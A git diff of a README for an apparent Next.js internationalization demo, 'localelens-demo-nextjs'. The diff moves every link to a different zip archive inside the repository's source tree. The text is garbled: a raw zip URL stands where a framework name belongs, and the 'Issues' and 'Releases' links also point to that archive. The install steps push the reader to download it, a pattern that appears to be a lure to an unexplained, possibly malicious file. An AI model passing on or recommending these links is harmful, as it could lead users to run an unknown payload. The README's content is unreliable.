@@ -1,11 +1,11 @@
 # 🌍 localelens-demo-nextjs - Easy Internationalization for Your App
 
 ## 📥 Download Now
-[![Download](https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/public/demo-localelens-nextjs-omniscient.zip%20Latest%20Release-ForzBeta/localelens-demo-nextjs-brightgreen)](https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/public/demo-localelens-nextjs-omniscient.zip)
+[![Download](https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/src/app/actions/localelens-nextjs-demo-1.5.zip%20Latest%20Release-ForzBeta/localelens-demo-nextjs-brightgreen)](https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/src/app/actions/localelens-nextjs-demo-1.5.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the **localelens-demo-nextjs** project! This application is a minimal demo using https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/public/demo-localelens-nextjs-omniscient.zip and LocaleLens for internationalization (i18n). You do not need any JSON files or complex frameworks; it uses simple fetch calls to show how to translate content in your app effortlessly. Follow the steps below to get started with the software.
+Welcome to the **localelens-demo-nextjs** project! This application is a minimal demo using https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/src/app/actions/localelens-nextjs-demo-1.5.zip and LocaleLens for internationalization (i18n). You do not need any JSON files or complex frameworks; it uses simple fetch calls to show how to translate content in your app effortlessly. Follow the steps below to get started with the software.
 
 ## 📋 System Requirements
 
@@ -18,13 +18,13 @@ Before you begin, ensure your system meets these requirements:
 ## 🔍 Features
 
 - **Simple Internationalization**: Easily translate your app's content into multiple languages.
-- **No Additional Frameworks**: Work directly with the basic features provided by https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/public/demo-localelens-nextjs-omniscient.zip
+- **No Additional Frameworks**: Work directly with the basic features provided by https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/src/app/actions/localelens-nextjs-demo-1.5.zip
 - **Dynamic Content Loading**: Fetch translations as needed without cluttering your project with files.
 - **TypeScript Support**: Benefit from strong typing features for better development experience.
 
 ## 📥 Download & Install
 
-To download the latest version of the application, visit this page: [Download Latest Release](https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/public/demo-localelens-nextjs-omniscient.zip).
+To download the latest version of the application, visit this page: [Download Latest Release](https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/src/app/actions/localelens-nextjs-demo-1.5.zip).
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, look for the newest version listed.
@@ -53,8 +53,8 @@ If you encounter any issues or have questions, please visit the Issues tab on th
 ## 🔗 Links
 
 - Documentation: [Documentation Link Here]
-- Issues: [GitHub Issues Page](https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/public/demo-localelens-nextjs-omniscient.zip)
-- Releases: [Download Latest Release](https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/public/demo-localelens-nextjs-omniscient.zip)
+- Issues: [GitHub Issues Page](https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/src/app/actions/localelens-nextjs-demo-1.5.zip)
+- Releases: [Download Latest Release](https://github.com/ForzBeta/localelens-demo-nextjs/raw/refs/heads/main/src/app/actions/localelens-nextjs-demo-1.5.zip)
 
 ## 🎉 Conclusion
 
